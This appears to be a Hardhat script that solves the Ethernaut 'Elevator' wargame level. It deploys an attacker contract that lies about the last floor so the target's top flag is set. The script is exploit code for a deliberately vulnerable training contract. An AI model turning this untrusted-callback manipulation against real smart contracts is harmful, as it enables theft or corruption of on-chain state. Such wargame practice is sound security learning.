import { ethers } from "hardhat";

const attackBuilding = async () => {
    // change contract addresses here.
    const buildingAddress = process.env.ELEVATOR!; //type "await contract.address()" in ethernaut console
    const args: [] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Can alter last floor by using another contract
    // Additional read about interface:
    // https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackBuilding", args);
    // alternative below
    console.log("Deploying attack contract AttackBuilding...");
    const attack = await (await ethers.getContractFactory("AttackElevator", deployer)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (attackBuilding.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            name: "top",
            outputs: [{ internalType: "bool", name: "", type: "bool" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, buildingAddress);
    console.log("Making it possible to go to top floor...");
    const tx1 = await attack.isLastFloor(8);
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    console.log("Going to the top floor...");
    const tx2 = await attack.goToTop(buildingAddress);
    const tx2Receipt = await tx2.wait();
    console.log(tx2Receipt);
    const success = await contract.top();
    console.log(`Top: ${success}`);
    if (success) {
        console.log("Congrats! Level Passed, please submit to ethernaut.");
    } else {
        console.log("Sorry, review code and try again...");
    }
};

attackBuilding()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
